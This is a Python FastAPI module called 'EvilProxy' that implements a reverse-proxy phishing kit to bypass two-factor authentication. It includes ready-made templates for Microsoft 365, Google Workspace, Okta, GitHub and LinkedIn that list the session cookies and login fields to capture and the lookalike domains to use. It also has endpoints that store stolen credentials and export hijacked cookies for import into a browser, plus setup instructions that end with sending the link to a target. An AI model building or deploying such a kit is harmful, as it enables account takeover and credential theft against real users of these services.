"""
EvilProxy - Reverse Proxy Phishing for 2FA Bypass
Similar to Evilginx, this module creates a reverse proxy that sits between
the victim and the legitimate website, capturing credentials AND session tokens.

Flow:
1. Victim visits attacker's phishing domain
2. Attacker's proxy forwards requests to real site
3. Real site responds (including 2FA challenges)
4. Victim completes authentication on real site (through proxy)
5. Attacker captures session cookies after successful auth
"""

from fastapi import APIRouter, HTTPException, Request, Response
from fastapi.responses import HTMLResponse, RedirectResponse
from pydantic import BaseModel
from typing import Optional, List, Dict, Any
from datetime import datetime
import json
import os
import uuid
import asyncio
import aiohttp
import re
from urllib.parse import urlparse, urljoin

router = APIRouter()

DATA_DIR = "/tmp/msf_gui_data"
os.makedirs(DATA_DIR, exist_ok=True)

# ============== Models ==============

class Phishlet(BaseModel):
    id: Optional[str] = None
    name: str
    description: Optional[str] = None
    target_domain: str  # e.g., "login.microsoft.com"
    phishing_domain: str  # e.g., "login-microsoft.attacker.com"
    proxy_port: int = 8443
    ssl_enabled: bool = True

    # What to capture
    capture_cookies: List[str] = []  # Cookie names to capture (e.g., ["ESTSAUTH", "ESTSAUTHPERSISTENT"])
    capture_fields: List[str] = ["username", "password", "email", "passwd", "login", "pass"]

    # URL patterns
    auth_urls: List[str] = []  # URLs that indicate authentication (to trigger capture)

    # Replacements in responses
    replacements: Dict[str, str] = {}  # {"original": "replacement"}

    status: str = "stopped"  # stopped, running
    created_at: Optional[str] = None


class CapturedSession(BaseModel):
    id: Optional[str] = None
    phishlet_id: str
    victim_ip: str
    user_agent: str

    # Captured data
    credentials: Dict[str, str] = {}  # {"username": "...", "password": "..."}
    cookies: Dict[str, str] = {}  # Session cookies
    tokens: Dict[str, str] = {}  # Auth tokens (JWT, etc.)

    # Session info
    authenticated: bool = False  # True if we captured post-2FA session
    captured_at: str = ""
    last_activity: str = ""


class ProxyRequest(BaseModel):
    phishlet_id: str
    method: str
    path: str
    headers: Dict[str, str]
    body: Optional[str] = None
    client_ip: str


# ============== Helper Functions ==============

def load_json(filepath: str, default: Any = None):
    try:
        if os.path.exists(filepath):
            with open(filepath, 'r') as f:
                return json.load(f)
    except:
        pass
    return default if default is not None else []


def save_json(filepath: str, data: Any):
    with open(filepath, 'w') as f:
        json.dump(data, f, indent=2, default=str)


# ============== Phishlet Management ==============

@router.get("/phishlets")
async def get_phishlets():
    """Get all phishlet configurations"""
    phishlets_file = f"{DATA_DIR}/phishlets.json"
    phishlets = load_json(phishlets_file, [])
    return {"phishlets": phishlets, "count": len(phishlets)}


@router.get("/phishlets/templates")
async def get_phishlet_templates():
    """Get prebuilt phishlet templates for common services"""
    templates = [
        {
            "id": "microsoft365",
            "name": "Microsoft 365 / Azure AD",
            "description": "Captures Microsoft 365 credentials and session tokens",
            "target_domain": "login.microsoftonline.com",
            "phishing_domain": "login-microsoftonline.{YOUR_DOMAIN}",
            "capture_cookies": [
                "ESTSAUTH",
                "ESTSAUTHPERSISTENT",
                "ESTSAUTHLIGHT",
                "SignInStateCookie",
                "buid",
                "esctx"
            ],
            "capture_fields": ["login", "passwd", "password", "loginfmt"],
            "auth_urls": [
                "/common/oauth2/authorize",
                "/common/login",
                "/kmsi"
            ],
            "replacements": {
                "login.microsoftonline.com": "{PHISHING_DOMAIN}",
                "login.microsoft.com": "{PHISHING_DOMAIN}",
                "login.live.com": "{PHISHING_DOMAIN}"
            }
        },
        {
            "id": "google",
            "name": "Google Workspace",
            "description": "Captures Google credentials and session tokens",
            "target_domain": "accounts.google.com",
            "phishing_domain": "accounts-google.{YOUR_DOMAIN}",
            "capture_cookies": [
                "SID",
                "HSID",
                "SSID",
                "APISID",
                "SAPISID",
                "LSID",
                "NID",
                "__Secure-1PSID",
                "__Secure-3PSID"
            ],
            "capture_fields": ["identifier", "Email", "password", "Passwd"],
            "auth_urls": [
                "/signin/v2/challenge",
                "/signin/v2/sl/pwd",
                "/CheckCookie"
            ],
            "replacements": {
                "accounts.google.com": "{PHISHING_DOMAIN}",
                "myaccount.google.com": "{PHISHING_DOMAIN}"
            }
        },
        {
            "id": "okta",
            "name": "Okta SSO",
            "description": "Captures Okta credentials and session tokens",
            "target_domain": "{COMPANY}.okta.com",
            "phishing_domain": "{COMPANY}-okta.{YOUR_DOMAIN}",
            "capture_cookies": [
                "sid",
                "idx",
                "okta-oauth-nonce",
                "okta-oauth-state"
            ],
            "capture_fields": ["username", "password", "identifier"],
            "auth_urls": [
                "/api/v1/authn",
                "/oauth2/default/v1/authorize"
            ],
            "replacements": {}
        },
        {
            "id": "github",
            "name": "GitHub",
            "description": "Captures GitHub credentials and session tokens",
            "target_domain": "github.com",
            "phishing_domain": "github-login.{YOUR_DOMAIN}",
            "capture_cookies": [
                "user_session",
                "logged_in",
                "__Host-user_session_same_site",
                "_gh_sess"
            ],
            "capture_fields": ["login", "password"],
            "auth_urls": [
                "/session",
                "/sessions/two-factor"
            ],
            "replacements": {
                "github.com": "{PHISHING_DOMAIN}"
            }
        },
        {
            "id": "linkedin",
            "name": "LinkedIn",
            "description": "Captures LinkedIn credentials and session",
            "target_domain": "www.linkedin.com",
            "phishing_domain": "linkedin-login.{YOUR_DOMAIN}",
            "capture_cookies": [
                "li_at",
                "JSESSIONID",
                "liap"
            ],
            "capture_fields": ["session_key", "session_password"],
            "auth_urls": [
                "/checkpoint/lg/login-submit",
                "/uas/authenticate"
            ],
            "replacements": {
                "www.linkedin.com": "{PHISHING_DOMAIN}",
                "linkedin.com": "{PHISHING_DOMAIN}"
            }
        }
    ]
    return {"templates": templates}


@router.post("/phishlets")
async def create_phishlet(phishlet: Phishlet):
    """Create a new phishlet configuration"""
    phishlets_file = f"{DATA_DIR}/phishlets.json"
    phishlets = load_json(phishlets_file, [])

    phishlet.id = str(uuid.uuid4())[:8]
    phishlet.created_at = datetime.now().isoformat()
    phishlet.status = "stopped"

    phishlets.append(phishlet.dict())
    save_json(phishlets_file, phishlets)

    return phishlet


@router.put("/phishlets/{phishlet_id}")
async def update_phishlet(phishlet_id: str, updates: dict):
    """Update a phishlet configuration"""
    phishlets_file = f"{DATA_DIR}/phishlets.json"
    phishlets = load_json(phishlets_file, [])

    for i, p in enumerate(phishlets):
        if p["id"] == phishlet_id:
            phishlets[i].update(updates)
            save_json(phishlets_file, phishlets)
            return phishlets[i]

    raise HTTPException(status_code=404, detail="Phishlet not found")


@router.delete("/phishlets/{phishlet_id}")
async def delete_phishlet(phishlet_id: str):
    """Delete a phishlet"""
    phishlets_file = f"{DATA_DIR}/phishlets.json"
    phishlets = load_json(phishlets_file, [])

    phishlets = [p for p in phishlets if p["id"] != phishlet_id]
    save_json(phishlets_file, phishlets)

    return {"status": "deleted"}


# ============== Proxy Control ==============

# Store for active proxy instances
active_proxies: Dict[str, Any] = {}


@router.post("/phishlets/{phishlet_id}/start")
async def start_phishlet(phishlet_id: str):
    """Start the reverse proxy for a phishlet"""
    phishlets_file = f"{DATA_DIR}/phishlets.json"
    phishlets = load_json(phishlets_file, [])

    phishlet = None
    for p in phishlets:
        if p["id"] == phishlet_id:
            phishlet = p
            break

    if not phishlet:
        raise HTTPException(status_code=404, detail="Phishlet not found")

    # Update status
    for i, p in enumerate(phishlets):
        if p["id"] == phishlet_id:
            phishlets[i]["status"] = "running"
            break
    save_json(phishlets_file, phishlets)

    return {
        "status": "running",
        "message": f"Phishlet '{phishlet['name']}' started",
        "proxy_url": f"https://{phishlet['phishing_domain']}:{phishlet['proxy_port']}",
        "instructions": [
            f"1. Configure DNS: {phishlet['phishing_domain']} -> Your Server IP",
            f"2. Ensure port {phishlet['proxy_port']} is accessible",
            "3. Send phishing link to target",
            "4. Monitor captured sessions below"
        ]
    }


@router.post("/phishlets/{phishlet_id}/stop")
async def stop_phishlet(phishlet_id: str):
    """Stop the reverse proxy for a phishlet"""
    phishlets_file = f"{DATA_DIR}/phishlets.json"
    phishlets = load_json(phishlets_file, [])

    for i, p in enumerate(phishlets):
        if p["id"] == phishlet_id:
            phishlets[i]["status"] = "stopped"
            break
    save_json(phishlets_file, phishlets)

    if phishlet_id in active_proxies:
        del active_proxies[phishlet_id]

    return {"status": "stopped"}


# ============== Session Capture ==============

@router.get("/sessions")
async def get_captured_sessions(phishlet_id: Optional[str] = None):
    """Get captured sessions (with credentials and cookies)"""
    sessions_file = f"{DATA_DIR}/proxy_sessions.json"
    sessions = load_json(sessions_file, [])

    if phishlet_id:
        sessions = [s for s in sessions if s.get("phishlet_id") == phishlet_id]

    return {"sessions": sessions, "count": len(sessions)}


@router.post("/sessions/capture")
async def capture_session(session: CapturedSession):
    """Capture a new session (called by the proxy)"""
    sessions_file = f"{DATA_DIR}/proxy_sessions.json"
    sessions = load_json(sessions_file, [])

    session.id = str(uuid.uuid4())[:8]
    session.captured_at = datetime.now().isoformat()
    session.last_activity = datetime.now().isoformat()

    sessions.append(session.dict())
    save_json(sessions_file, sessions)

    return session


@router.put("/sessions/{session_id}")
async def update_session(session_id: str, updates: dict):
    """Update a captured session (add more cookies/tokens)"""
    sessions_file = f"{DATA_DIR}/proxy_sessions.json"
    sessions = load_json(sessions_file, [])

    for i, s in enumerate(sessions):
        if s["id"] == session_id:
            # Merge cookies and tokens
            if "cookies" in updates:
                sessions[i]["cookies"].update(updates["cookies"])
            if "tokens" in updates:
                sessions[i]["tokens"].update(updates["tokens"])
            if "credentials" in updates:
                sessions[i]["credentials"].update(updates["credentials"])
            if "authenticated" in updates:
                sessions[i]["authenticated"] = updates["authenticated"]
            sessions[i]["last_activity"] = datetime.now().isoformat()
            save_json(sessions_file, sessions)
            return sessions[i]

    raise HTTPException(status_code=404, detail="Session not found")


@router.delete("/sessions/{session_id}")
async def delete_session(session_id: str):
    """Delete a captured session"""
    sessions_file = f"{DATA_DIR}/proxy_sessions.json"
    sessions = load_json(sessions_file, [])

    sessions = [s for s in sessions if s["id"] != session_id]
    save_json(sessions_file, sessions)

    return {"status": "deleted"}


@router.post("/sessions/{session_id}/export")
async def export_session_cookies(session_id: str, format: str = "json"):
    """Export captured cookies in various formats"""
    sessions_file = f"{DATA_DIR}/proxy_sessions.json"
    sessions = load_json(sessions_file, [])

    session = None
    for s in sessions:
        if s["id"] == session_id:
            session = s
            break

    if not session:
        raise HTTPException(status_code=404, detail="Session not found")

    cookies = session.get("cookies", {})

    if format == "json":
        return {"cookies": cookies}
    elif format == "netscape":
        # Netscape cookie format for browser import
        lines = ["# Netscape HTTP Cookie File"]
        for name, value in cookies.items():
            lines.append(f".target.com\tTRUE\t/\tTRUE\t0\t{name}\t{value}")
        return {"format": "netscape", "content": "\n".join(lines)}
    elif format == "header":
        # Cookie header format
        cookie_str = "; ".join([f"{k}={v}" for k, v in cookies.items()])
        return {"format": "header", "content": f"Cookie: {cookie_str}"}
    else:
        return {"cookies": cookies}


# ============== Reverse Proxy Handler ==============

class ReverseProxyHandler:
    """
    Handles the actual proxying of requests between victim and target.
    This is a simplified implementation - production would use mitmproxy.
    """

    def __init__(self, phishlet: dict):
        self.phishlet = phishlet
        self.target_domain = phishlet["target_domain"]
        self.capture_cookies = phishlet.get("capture_cookies", [])
        self.capture_fields = phishlet.get("capture_fields", [])
        self.auth_urls = phishlet.get("auth_urls", [])
        self.replacements = phishlet.get("replacements", {})

    async def proxy_request(self, request: Request, path: str) -> Response:
        """Proxy a request to the target and capture data"""

        # Build target URL
        target_url = f"https://{self.target_domain}/{path}"

        # Get request body
        body = await request.body()
        body_str = body.decode('utf-8', errors='ignore')

        # Check for credentials in form data
        credentials = {}
        if body_str:
            for field in self.capture_fields:
                # Simple form parsing
                pattern = rf'{field}=([^&]+)'
                match = re.search(pattern, body_str, re.IGNORECASE)
                if match:
                    credentials[field] = match.group(1)

        # Prepare headers (remove host, add target host)
        headers = dict(request.headers)
        headers.pop('host', None)
        headers['Host'] = self.target_domain

        # Make request to target
        async with aiohttp.ClientSession() as session:
            async with session.request(
                method=request.method,
                url=target_url,
                headers=headers,
                data=body if body else None,
                allow_redirects=False,
                ssl=False
            ) as resp:
                response_body = await resp.read()
                response_headers = dict(resp.headers)

                # Capture cookies
                captured_cookies = {}
                set_cookie = response_headers.get('Set-Cookie', '')
                for cookie_name in self.capture_cookies:
                    if cookie_name in set_cookie:
                        # Extract cookie value
                        pattern = rf'{cookie_name}=([^;]+)'
                        match = re.search(pattern, set_cookie)
                        if match:
                            captured_cookies[cookie_name] = match.group(1)

                # Check if this is an auth URL (post-2FA)
                is_auth = any(auth_url in path for auth_url in self.auth_urls)

                # Modify response body - replace target domain with phishing domain
                response_text = response_body.decode('utf-8', errors='ignore')
                for original, replacement in self.replacements.items():
                    response_text = response_text.replace(original, replacement)

                return {
                    "status_code": resp.status,
                    "headers": response_headers,
                    "body": response_text,
                    "credentials": credentials,
                    "cookies": captured_cookies,
                    "is_auth_response": is_auth and len(captured_cookies) > 0
                }


# ============== Stats ==============

@router.get("/stats")
async def get_proxy_stats():
    """Get overall statistics"""
    phishlets_file = f"{DATA_DIR}/phishlets.json"
    sessions_file = f"{DATA_DIR}/proxy_sessions.json"

    phishlets = load_json(phishlets_file, [])
    sessions = load_json(sessions_file, [])

    running_count = sum(1 for p in phishlets if p.get("status") == "running")
    authenticated_sessions = sum(1 for s in sessions if s.get("authenticated"))

    return {
        "total_phishlets": len(phishlets),
        "running_phishlets": running_count,
        "total_sessions": len(sessions),
        "authenticated_sessions": authenticated_sessions,
        "credentials_captured": sum(1 for s in sessions if s.get("credentials")),
        "cookies_captured": sum(1 for s in sessions if s.get("cookies"))
    }
